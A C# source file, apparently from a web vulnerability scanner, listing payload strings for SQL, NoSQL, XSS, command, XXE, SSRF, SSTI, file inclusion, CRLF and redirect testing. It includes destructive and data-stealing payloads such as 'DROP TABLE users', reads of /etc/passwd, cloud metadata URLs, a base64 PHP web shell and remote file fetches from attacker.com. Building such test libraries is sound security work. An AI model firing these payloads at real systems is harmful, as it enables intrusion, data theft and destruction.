using System;
using System.Collections.Generic;

namespace WebTrafficInspector.Services
{
    /// <summary>
    /// Advanced payload collections for comprehensive vulnerability testing
    /// Contains cutting-edge exploitation vectors for OWASP Top 10 2025
    /// </summary>
    public static class AdvancedPayloads
    {
        #region SQL Injection Payloads

        public static readonly List<string> SQLInjectionPayloads = new List<string>
        {
            // Classic SQL Injection
            "' OR '1'='1",
            "' OR 1=1--",
            "' OR 'a'='a",
            "admin'--",
            "admin' #",
            "admin'/*",

            // Union-based SQL Injection
            "' UNION SELECT NULL--",
            "' UNION SELECT NULL,NULL--",
            "' UNION SELECT NULL,NULL,NULL--",
            "' UNION ALL SELECT NULL--",
            "' UNION SELECT @@version--",
            "' UNION SELECT table_name FROM information_schema.tables--",
            "' UNION SELECT column_name FROM information_schema.columns--",

            // Boolean-based Blind SQL Injection
            "' AND 1=1--",
            "' AND 1=2--",
            "' AND 'x'='x",
            "' AND 'x'='y",
            "' AND SUBSTRING(@@version,1,1)='5",

            // Time-based Blind SQL Injection
            "'; WAITFOR DELAY '0:0:5'--",
            "'; SELECT SLEEP(5)--",
            "'; pg_sleep(5)--",
            "' AND SLEEP(5)--",
            "' AND (SELECT * FROM (SELECT(SLEEP(5)))a)--",
            "' OR IF(1=1,SLEEP(5),0)--",

            // Error-based SQL Injection
            "' AND extractvalue(1,concat(0x7e,(SELECT @@version)))--",
            "' AND updatexml(1,concat(0x7e,@@version),1)--",

            // Stacked Queries
            "'; DROP TABLE users--",
            "'; EXEC xp_cmdshell('whoami')--",

            // Advanced Bypass Techniques
            "' OR '1'='1' UNION SELECT NULL--",
            "' /**/OR/**/1=1--",
            "' OR 1=1#",
            "' OR 1=1/*",

            // Database-specific
            "' AND 1=CONVERT(int,(SELECT @@version))--",
            "' AND 1=CAST((SELECT version()) AS int)--",

            // Unicode/Encoding Bypass
            "%27 OR 1=1--"
        };

        #endregion

        #region NoSQL Injection Payloads

        public static readonly List<string> NoSQLInjectionPayloads = new List<string>
        {
            // MongoDB Injection
            "' || '1'=='1",
            "' && '1'=='1",
            "{\"$gt\":\"\"}",
            "{\"$ne\":null}",
            "{\"$where\":\"1==1\"}",
            "{\"$regex\":\".*\"}",
            "{\"$gt\":0}",

            // Array Injection
            "[$ne]=1",
            "[$gt]=",
            "[$regex]=.*",

            // Time-based NoSQL
            "';sleep(5000);'"
        };

        #endregion

        #region XSS Payloads

        public static readonly List<string> XSSPayloads = new List<string>
        {
            // Basic XSS
            "<script>alert(1)</script>",
            "<script>alert('XSS')</script>",
            "<script>alert(document.cookie)</script>",

            // Event Handler XSS
            "<img src=x onerror=alert(1)>",
            "<svg onload=alert(1)>",
            "<body onload=alert(1)>",
            "<input onfocus=alert(1) autofocus>",

            // Advanced XSS
            "<img src=x onerror=eval(atob('YWxlcnQoMSk='))>",
            "<svg><script>alert&#40;1&#41;</script>",
            "<iframe src=javascript:alert(1)>",

            // DOM-based XSS
            "javascript:alert(1)",
            "javascript:alert(document.cookie)",

            // Filter Bypass XSS
            "<scr<script>ipt>alert(1)</scr<script>ipt>",
            "<img src=\"x\" onerror=\"alert(1)\">",
            "<svg/onload=alert(1)>",

            // HTML5
            "<video src=x onerror=alert(1)>",
            "<audio src=x onerror=alert(1)>",

            // Angular Template Injection XSS
            "{{constructor.constructor('alert(1)')()}}",
            "{{7*7}}",

            // WAF Bypass XSS
            "<img src=\"x\" onerror=\"window['al'+'ert'](1)\">",

            // SVG-based XSS
            "<svg><animate onbegin=alert(1) attributeName=x dur=1s>"
        };

        #endregion

        #region Command Injection Payloads

        public static readonly List<string> CommandInjectionPayloads = new List<string>
        {
            // Unix/Linux Command Injection
            "; ls",
            "| ls",
            "& ls",
            "&& ls",
            "|| ls",
            "`ls`",
            "$(ls)",
            "; whoami",
            "| whoami",
            "; cat /etc/passwd",
            "| cat /etc/passwd",

            // Windows Command Injection
            "& dir",
            "| dir",
            "&& dir",

            // Blind Command Injection
            "; sleep 5",
            "| sleep 5",
            "& ping -c 5 127.0.0.1",

            // Time-based
            "; sleep 10 #",
            "& timeout 10"
        };

        #endregion

        #region LDAP Injection Payloads

        public static readonly List<string> LDAPInjectionPayloads = new List<string>
        {
            // Basic LDAP Injection
            "*",
            "*)(&",
            "*)(uid=*))(|(uid=*",
            "admin*",
            "admin*)((|userpassword=*",

            // LDAP Filter Bypass
            "*)(&(objectClass=*",
            "*)(&(cn=*",
            "*)(|(password=*",

            // Blind LDAP Injection
            "admin)(&(password=*",
            "admin)(&(objectClass=*"
        };

        #endregion

        #region XXE Payloads

        public static readonly List<string> XXEPayloads = new List<string>
        {
            // Basic XXE
            "<?xml version=\"1.0\"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM \"file:///etc/passwd\">]><foo>&xxe;</foo>",

            // XXE with DTD
            "<?xml version=\"1.0\"?><!DOCTYPE foo [<!ENTITY % xxe SYSTEM \"http://attacker.com/evil.dtd\"> %xxe;]><foo/>",

            // Blind XXE
            "<?xml version=\"1.0\"?><!DOCTYPE foo [<!ENTITY % xxe SYSTEM \"http://attacker.com/\"> %xxe;]><foo/>"
        };

        #endregion

        #region SSRF Payloads

        public static readonly List<string> SSRFPayloads = new List<string>
        {
            // Basic SSRF
            "http://127.0.0.1",
            "http://localhost",
            "http://0.0.0.0",
            "http://169.254.169.254",
            "http://metadata.google.internal",

            // SSRF with different protocols
            "file:///etc/passwd",
            "dict://localhost:11211",
            "gopher://127.0.0.1:6379",

            // URL Bypass
            "http://127.1",
            "http://2130706433",
            "http://0x7f000001",
            "http://127.0.0.1.xip.io",

            // Cloud Metadata
            "http://169.254.169.254/latest/meta-data/",
            "http://metadata.google.internal/computeMetadata/v1/"
        };

        #endregion

        #region SSTI Payloads

        public static readonly List<string> SSTIPayloads = new List<string>
        {
            // Generic SSTI Detection
            "${7*7}",
            "{{7*7}}",
            "<%= 7*7 %>",
            "#{7*7}",

            // Jinja2 (Python)
            "{{config.items()}}",
            "{{''.__class__.__mro__[1].__subclasses__()}}",
            "{{7*'7'}}",

            // Freemarker (Java)
            "${\"freemarker.template.utility.Execute\"?new()(\"id\")}",

            // ERB (Ruby)
            "<%= system('id') %>",
            "<%= `whoami` %>",

            // Jade/Pug (Node.js)
            "#{global.process.mainModule.require('child_process').execSync('id')}",

            // AngularJS
            "{{constructor.constructor('alert(1)')()}}"
        };

        #endregion

        #region Path Traversal Payloads

        public static readonly List<string> PathTraversalPayloads = new List<string>
        {
            // Basic Path Traversal
            "../",
            "..\\",
            "../../",
            "..\\..\\",
            "../../../",
            "../../../../etc/passwd",
            "..\\..\\..\\..\\windows\\system32\\drivers\\etc\\hosts",

            // Absolute Paths
            "/etc/passwd",
            "C:\\windows\\system32\\config\\sam",

            // URL Encoded
            "%2e%2e%2f",
            "%2e%2e/",
            "..%2f",
            "%2e%2e%5c",

            // Null Byte Injection
            "../../../etc/passwd%00",
            "..\\..\\..\\windows\\win.ini%00"
        };

        #endregion

        #region File Inclusion Payloads

        public static readonly List<string> FileInclusionPayloads = new List<string>
        {
            // Local File Inclusion (LFI)
            "php://filter/convert.base64-encode/resource=index.php",
            "php://input",
            "php://filter/read=string.rot13/resource=index.php",
            "expect://whoami",
            "data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWydjbWQnXSk7Pz4=",

            // Remote File Inclusion (RFI)
            "http://attacker.com/shell.txt",
            "ftp://attacker.com/shell.php",

            // Log Poisoning
            "/var/log/apache2/access.log",
            "/var/log/nginx/access.log",

            // Session File Inclusion
            "/var/lib/php/sessions/sess_[PHPSESSID]",

            // /proc/ LFI
            "/proc/self/environ",
            "/proc/self/cmdline"
        };

        #endregion

        #region CRLF Injection Payloads

        public static readonly List<string> CRLFInjectionPayloads = new List<string>
        {
            // Basic CRLF Injection
            "%0d%0aSet-Cookie: admin=true",
            "%0d%0aLocation: http://attacker.com",
            "%0d%0aContent-Length: 0%0d%0a%0d%0aHTTP/1.1 200 OK",

            // Header Injection
            "%0d%0aX-XSS-Protection: 0",
            "%0d%0aX-Frame-Options: ALLOW"
        };

        #endregion

        #region Open Redirect Payloads

        public static readonly List<string> OpenRedirectPayloads = new List<string>
        {
            // Basic Open Redirect
            "http://evil.com",
            "https://evil.com",
            "//evil.com",
            "///evil.com",

            // Protocol-less
            "//evil.com",

            // URL Encoded
            "%2f%2fevil.com",

            // Scheme Manipulation
            "javascript:alert(1)",

            // Host Confusion
            "http://evil.com@target.com",
            "http://target.com.evil.com"
        };

        #endregion

        #region IDOR Test Values

        public static readonly List<string> IDORTestValues = new List<string>
        {
            // Numeric IDs
            "1", "2", "3", "100", "999", "9999",
            "0", "-1", "2147483647",

            // String IDs
            "admin", "administrator", "root", "user",

            // Path Traversal in IDs
            "../1", "../../admin", "../../../config"
        };

        #endregion

        #region CORS Test Origins

        public static readonly List<string> CORSTestOrigins = new List<string>
        {
            "http://evil.com",
            "https://evil.com",
            "http://attacker.com",
            "null",
            "http://localhost"
        };

        #endregion
    }
}
